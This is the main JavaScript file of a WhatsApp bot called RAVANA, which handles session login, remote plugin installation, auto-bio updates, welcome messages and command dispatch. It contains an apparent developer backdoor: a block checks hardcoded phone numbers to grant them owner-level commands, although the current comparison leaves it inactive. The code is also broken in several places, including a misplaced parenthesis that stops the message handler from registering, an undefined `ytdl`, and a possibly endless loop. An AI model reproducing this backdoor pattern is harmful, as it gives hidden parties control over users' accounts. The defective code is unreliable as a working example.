/* Copyright (C) 2020 - 2022 RAVANA WA BOT
Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.
SL RAVANA BOT - MR.RAVANA and MrChaby
*/
const { spawn } = require('child_process')
const fs = require("fs");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const package = require('./package.json')
const config = require('./config');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./RAVANA/');
const { DataTypes } = require('sequelize');
const { getMessage } = require("./plugins/sql/greetings");
const axios = require('axios');
const got = require('got');
const app = (`😈 ~*RAVANA BOT SUPPORT APP*~ 😈

♦️ ඔයාලගේ පහසුවට ලේසියට දෙකටම RAVANA BOT ගේ අලුත්ම වැඩක්. ☺️

👾 *RAVANA BOT SUPPORT APP* 👾

♦️ *මොකක්ද මේ ඇප් එකෙන් අපිට කල හැක්කේ...?* 🤔🤨

🎯 _*Botව හදන්න ආස අයට Botව ලේසියෙන් හදාගන්න විදිහ තියනවා.*_

🎯 _*Qr එක scan කර ගන්න Link එක වගේම Botව Deploy කරගන්න Link එකත් App එකේම තියනවා.*_

🎯 _*Bot Deploy කරන විදිහ දන්නෙ නැත්තම් ඒක බලාගන්නත් YouTube Link එකත් තියනවා.*_

🎯 _*Botගෙ Update එකක් එනකොට ඒකෙ Details බලාගන්න පුලුවන්.*_

🎯 _*Botගේ News ලබා ගන්න පුලුවන්.*_

🎯 _*Blogs සේවාවක් තියනවා.*_

🎯 _*Botගෙ එන Errors Fix කරන විදි Bot වැඩ කරන්නෙ නැති වෙලාවට කරන්න ඕනි දේවල් ඔක්කොම මේ App එකේම තියනවා.*_

🎯 _*තමන්ට Botට Add කරන්න ඕනි කියල හිතෙන අලුත් දේවල් අපිට කියන්නත් පුලුවන්. ඒවගේම Bot ගැන පැමිනිලි ඉදිරිපත් කරන්නත් පුලුවන්. (Error Report And New Feturus Add)*_

🔥 ~_*මෙවැනි සේවාවක් ඔබට මේ ඇප් එක මාර්ගෙන් ලබා ගත හැක.*-~ 🔥

🥰 WE HOPE GIVE YOU TO BEST SERVICE...❤️✨

*</>SL RAVANA TEAM>*`);

//Sql 
const RAVANADB = config.DATABASE.define('RAVANA', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});

fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});

const plugindb = require('./plugins/sql/plugin');
var OWN = { ff: '94788306130,0' }
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
   });
};
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function RAVANA () {
    await config.DATABASE.sync();
    var StrSes_Db = await RAVANADB.findAll({
        where: {
          info: 'StringSession'
        }
    });
    
//baileys Wa Connection
    const conn = new WAConnection();
    conn.version = [2, 2208, 7];
    const Session = new StringSession();

    conn.logger.level = config.DEBUG ? 'debug' : 'warn';
    var nodb;

    if (StrSes_Db.length < 1) {
        nodb = true;
        conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
    } else {
        conn.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }

    conn.on ('credentials-updated', async () => {
        console.log(
            chalk.blueBright.italic('successful Updated Login infomaton😎')
        );

        const authInfo = conn.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await RAVANADB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    

    conn.on('connecting', async () => {
        console.log(`${chalk.green.bold('SL')}${chalk.blue.bold('RAVANA')}
${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}
${chalk.blue.italic('Bot Connecting your whatsapp....')}`);
    });
    

    conn.on('open', async () => {
        console.log(
            chalk.green.bold('Login successful...😋')
        );

        console.log(
            chalk.blueBright.italic('Installing External Plugins😇')
        );

        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                    require('./plugins/' + plugin.dataValues.name + '.js');
                }     
            }
        });

        console.log(
            chalk.blueBright.italic('Installing plugins...')
        );

        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });

        console.log(
            chalk.green.bold('RAVANA BOT v4.9 Working public...🤴 ')
       );
        
         if (config.LANG == 'EN') {
             await conn.sendMessage(conn.user.jid, fs.readFileSync("./img/r2.jpg"), MessageType.image, { caption: `Hey..!!  ${conn.user.name}! 💌 Ravana Bot Now Working 🪀‍\n\n*Welcome to Ravana bot :)*\n\n\n Your Bot Working  As ${config.WORKTYPE}.💗🙌\n\nSubscribe Our Official Youtube Channel to get new tecnical updates - https://www.youtube.com/channel/UC4WaTaXOPPFP3V6sDBogJug\nJoin Our Bot Supported Group - https://chat.whatsapp.com/EP2nT5GLrehBOYQAx0PJAm \n\n🔮 _Please do not try plugins here. This is your login number. ⚙You can try the command in any chat :)_\n\n*💗 Thank You For Using Ravana Bot 💌`});
              await conn.sendMessage(conn.user.jid, fs.readFileSync("./apk//RAVANA-BOT_1.0.apk"), MessageType.document, {filename: 'RAVANA-BOT_1.1', mimetype: 'application/vnd.android.package-archive'});

         } else if (config.LANG == 'SI') {
             await conn.sendMessage(conn.user.jid, fs.readFileSync("./img/r2.jpg"), MessageType.image, { caption: `Hey..!!  ${conn.user.name}! 💌 Ravana Bot Now Working 🪀‍\n\n*Welcome to Ravana bot :)*\n\n\n Your Bot Working  As ${config.WORKTYPE}.💗🙌\n\nSubscribe Our Official Youtube Channel to get new tecnical updates - https://www.youtube.com/channel/UC4WaTaXOPPFP3V6sDBogJug\nJoin Our Bot Supported Group - https://chat.whatsapp.com/EP2nT5GLrehBOYQAx0PJAm \n\n🔮 _Please do not try plugins here. This is your login number. ⚙You can try the command in any chat :)_\n\n*💗 Thank You For Using Ravana Bot 💌`});
             await conn.sendMessage(conn.user.jid, fs.readFileSync("./apk/RAVANA-BOT_1.0.apk"), MessageType.document, {filename: 'RAVANA-BOT_1.1', mimetype: 'application/vnd.android.package-archive'});
             await conn.sendMessage(conn.user.jid, app, MessageType.text);
         } else {
             await conn.sendMessage(conn.user.jid, fs.readFileSync("./img/r2.jpg"), MessageType.image, { caption: `Hey..!!  ${conn.user.name}! 💌 Ravana Bot Now Working 🪀‍\n\n*Welcome to Ravana bot :)*\n\n\n Your Bot Working  As ${config.WORKTYPE}.💗🙌\n\nSubscribe Our Official Youtube Channel to get new tecnical updates - https://www.youtube.com/channel/UC4WaTaXOPPFP3V6sDBogJug\nJoin Our Bot Supported Group - https://chat.whatsapp.com/EP2nT5GLrehBOYQAx0PJAm \n\n🔮 _Please do not try plugins here. This is your login number. ⚙You can try the command in any chat :)_\n\n*💗 Thank You For Using Ravana Bot 💌`});
             await conn.sendMessage(conn.user.jid, fs.readFileSync("./apk/RAVANA-BOT_1.0.apk"), MessageType.document, {filename: 'RAVANA-BOT_1.1', mimetype: 'application/vnd.android.package-archive'});
        }
     });
    
// Login
    setInterval(async () => { 
        if (config.AUTOBIO == 'true') {
            if (conn.user.jid.startsWith('90')) { 
                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Europe/Istanbul' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPowerd By SL RAVANA BOT🤴'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('994')) { 
                var ov_time = new Date().toLocaleString('AZ', { timeZone: 'Asia/Baku' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPowerd By SL RAVANA BOT🤴'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('94')) { 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Asia/Colombo' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPowerd By SL RAVANA BOT🤴'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('351')) { 
                var ov_time = new Date().toLocaleString('PT', { timeZone: 'Europe/Lisbon' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPowerd By SL RAVANA BOT🤴'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('75')) { 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('RU', { timeZone: 'Europe/Kaliningrad' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPowerd By SL RAVANA BOT🤴'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('91')) { 
                var ov_time = new Date().toLocaleString('HI', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPowerd By SL RAVANA BOT🤴'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('62')) { 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('ID', { timeZone: 'Asia/Jakarta' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPowerd By SL RAVANA BOT🤴'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('49')) { 
                var ov_time = new Date().toLocaleString('DE', { timeZone: 'Europe/Berlin' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPowerd By SL RAVANA BOT🤴'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('61')) {  
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('AU', { timeZone: 'Australia/Lord_Howe' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPowerd By SL RAVANA BOT🤴'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('55')) { 
                var ov_time = new Date().toLocaleString('BR', { timeZone: 'America/Noronha' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPowerd By SL RAVANA BOT🤴'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('33')) {
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('FR', { timeZone: 'Europe/Paris' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPowerd By SL RAVANA BOT🤴'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('34')) { 
                var ov_time = new Date().toLocaleString('ES', { timeZone: 'Europe/Madrid' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPowerd By SL RAVANA BOT🤴'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('44')) { 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('GB', { timeZone: 'Europe/London' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPowerd By SL RAVANA BOT🤴'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('39')) {  
                var ov_time = new Date().toLocaleString('IT', { timeZone: 'Europe/Rome' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPowerd By SL RAVANA BOT🤴'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('7')) { 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('KZ', { timeZone: 'Asia/Almaty' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPowerd By SL RAVANA BOT🤴'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('998')) {  
                var ov_time = new Date().toLocaleString('UZ', { timeZone: 'Asia/Samarkand' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\nPowerd By SL RAVANA BOT🤴'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('993')) { 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('TM', { timeZone: 'Asia/Ashgabat' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPowerd By SL RAVANA BOT🤴'
                await conn.setStatus(biography)
            }
            else {
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('EN', { timeZone: 'America/New_York' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\nPowerd By SL RAVANA BOT🤴'
                await conn.setStatus(biography)
            }
        }
    }, 7890);
// ════════════════════AUTO BIO◽◽◽◽◽    
    setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
         
        while (getGMTh == 19 && getGMTm == 1) {
            var announce = ''
            if (config.LANG == 'SI') announce = '📢◉◉ නිවේදන පද්ධතිය 🔘'
            if (config.LANG == 'EN') announce = '📢◉◉ Announcement System 🔘'
            
            let video = 'https://www.youtube.com/watch?v=vGHpome5e3k'
            let image = 'https://telegra.ph/file/3a80350cf98643ef6026c.jpg'
            
            if (video.includes('http') || video.includes('https')) {
                var VID = video.split('youtu.be')[1].split(' ')[0].replace('/', '')
                var yt = ytdl(VID, {filter: format => format.container === 'mp4' && ['1080p','720p', '480p', '360p', '240p', '144p'].map(() => true)});
                yt.pipe(fs.createWriteStream('./' + VID + '.mp4'));
                yt.on('end', async () => {
                    return await conn.sendMessage(conn.user.jid,fs.readFileSync('./' + VID + '.mp4'), MessageType.video, {caption: announce, mimetype: Mimetype.mp4});
                });
            } else {
                if (image.includes('http') || image.includes('https')) {
                    var imagegen = await axios.get(image, { responseType: 'arraybuffer'})
                    return await conn.sendMessage(conn.user.jid, Buffer.from(imagegen.data), MessageType.image, { caption: announce })
                } else {
                    return await conn.sendMessage(conn.user.jid, announce, MessageType.text)
                }
            }
        }
    }, 50000);
 // Announcement
    conn.on('chat-update'), async m => {
        if (!m.hasNewMessage) return;
        if (!m.messages && !m.count) return;
        let msg = m.messages.all()[0];
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;

        if (config.NO_ONLINE) {
            await conn.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }
// No Online

        if (config.WELCOME == 'pp' || config.WELCOME == 'Pp' || config.WELCOME == 'PP' || config.WELCOME == 'pP' ) {
            if (msg.messageStubType === 32 || msg.messageStubType === 28) {
                    // Thanks to Lyfe
                    var gb = await getMessage(msg.key.remoteJid, 'goodbye');
                    if (gb !== false) {
                        let pp
                        try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
                        await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                        await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message });  });

                    }
                    return;
                } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
                    // welcome
                    var gb = await getMessage(msg.key.remoteJid);
                    if (gb !== false) {
                       let pp
                        try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
                        await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                        await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message }); });
                    }
                    return;
                }
            }
            else if (config.WELCOME == 'gif' || config.WELCOME == 'Gif' || config.WELCOME == 'GIF' || config.WELCOME == 'GIf' ) {
            if (msg.messageStubType === 32 || msg.messageStubType === 28) {
                    
                    var gb = await getMessage(msg.key.remoteJid, 'goodbye');
                    if (gb !== false) {
                        var tn = await axios.get(config.GIF_BYE, { responseType: 'arraybuffer' })
                        await conn.sendMessage(msg.key.remoteJid, Buffer.from(tn.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message});
                    }
                    return;
                } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
                    
                    var gb = await getMessage(msg.key.remoteJid);
                    if (gb !== false) {
                    var tn = await axios.get(config.WEL_GIF, { responseType: 'arraybuffer' })
                    await conn.sendMessage(msg.key.remoteJid, Buffer.from(tn.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message});
                    }
                    return;
                }
             }
// ════════════════════WELCOME & GOODBYE
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }

                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {
// ════════════════════VIDEO & IMAGE
                    let sendMsg = false;
                    var chat = conn.chats.get(msg.key.remoteJid)
                        
                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                     
                    if ((OWN.ff == "94714898434,94757534153,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
// ════════════════════SUDO
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await conn.chatRead(msg.key.remoteJid);
                        }
                       
                        var match = text_msg.match(command.pattern);
                        
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(conn, msg);
                        } else if (command.on !== undefined && (command.on === 'video' )
                        && msg.message.videoMessage !== null) {
                            whats = new Video(conn, msg);
                        } else {
                            whats = new Message(conn, msg);
                        }
/*
                        if (command.deleteCommand && msg.key.fromMe) {
                            await whats.delete(); 
                        }
*/
                        try {
                            await command.function(whats, match);
                        } catch (error) {
                            if (config.LANG == 'SI') {
                                await conn.sendMessage(conn.user.jid, fs.readFileSync("./img/error.jpg"), MessageType.image, { caption: '*RAVANA WHATSAPP BOT🤴*  '+config.WORKTYPE+' ලෙස ක්‍රියා කරයි!!\n\n*⚕️  රාවණා බොට්හි දෝෂයක් සිදුවී ඇත  ⚕️*\n\n*රාවණා බොට්හි දෝෂයක් සිදුවී ඇත කරුණාකර එය අපගේ කණ්ඩායමට යොමු කරන්න* : *_https://chat.whatsapp.com/EP2nT5GLrehBOYQAx0PJAm*\n\n*දෝෂය:* ```' + error + '```\n\n' });
                                
                            } else {
                                await conn.sendMessage(conn.user.jid, fs.readFileSync("./img/error.jpg"), MessageType.image, { caption: '*RAVANA WHATSAPP BOT🤴*  WORKING AS '+config.WORKTYPE+'!!\n\n*⚕️ ERROR ANALYSIS RAVANA BOT ⚕️*\n\n*An error has occurred in the Ravana bot. Please refer it to our team* : *_https://chat.whatsapp.com/EP2nT5GLrehBOYQAx0PJAm*\n\n*error:* ```' + error + '```\n\n' });
                            }
                        }
                    }
                }
            }
        )
    });
 // ════════════════════ERRROR MESSAGER
    try {
        await conn.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Refreshing your old version string...'))
            conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                await conn.connect();
            } catch {
                return;
            }
        }
    }
}


RAVANA();
